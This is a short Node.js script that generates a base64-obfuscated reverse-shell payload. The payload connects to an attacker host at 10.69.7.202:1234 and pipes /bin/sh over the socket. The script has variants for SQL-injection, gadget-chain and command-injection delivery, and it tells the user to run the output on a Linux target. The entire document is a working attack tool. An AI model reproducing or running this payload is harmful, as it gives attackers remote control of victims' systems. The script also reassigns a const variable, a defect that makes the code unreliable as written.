const ip = "10.69.7.202";
const port = 1234;


// We swap 'cmd.exe' for '/bin/sh' to target the Linux shell
const payload = `
const net=require('net'),{spawn}=require('child_process'),client=new net.Socket();
client.connect(${port},'${ip}',()=>{
    const s=spawn('/bin/sh',[],{shell:true});
    client.pipe(s.stdin);
    s.stdout.pipe(client);
    s.stderr.pipe(client);
    });`;
    



const is_for_BACKEND_sql_injection = true;
const is_for_FRONTEND_gadgetchain = true;
const is_for_COMMAND_default = true;




const encoded = Buffer.from(payload).toString('base64');
const command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;

if (is_for_BACKEND_sql_injection)
{
    command = `¿'; \\!` + `node -e "eval(Buffer.from('${encoded}','base64').toString())"` + `#`;
}
else if (is_for_FRONTEND_gadgetchain)
{
    command = `"eval(Buffer.from('${encoded}','base64').toString())"`;
}    
else if (is_for_COMMAND_default)
{
    command = `node -e "eval(Buffer.from('${encoded}','base64').toString())"`;
} 


console.log("Run this command on your Linux target:");
console.log(command);


